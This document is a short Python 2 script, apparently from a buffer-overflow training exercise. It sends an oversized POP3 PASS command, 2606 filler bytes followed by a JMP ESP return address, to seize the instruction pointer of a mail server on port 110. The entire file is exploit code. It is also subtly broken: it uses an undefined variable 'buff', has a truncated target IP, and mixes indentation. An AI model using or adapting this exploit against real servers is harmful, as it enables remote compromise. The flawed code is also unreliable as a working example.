import socket
import struct
import sys


rhost="19.168."
rport=110

size = 3200
ptr_jmp_esp = 0x5F4A358F

payload = ""
payload += "PASS "
payload += "A"*2606
payload += struct.pack("<I",ptr_jmp_esp) # Automatic little endian conversion
payload += "C"*(size-len(buff))
payload += "\r\n"

try:
    print "Gaining EIP..."
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((rhost,rport))
    s.recv(1024)
    s.send("USER test\r\n")
    s.recv(1024)
    s.send(payload)
    s.close()
except:
	print "Oops! Something went wrong!"
    sys.exit()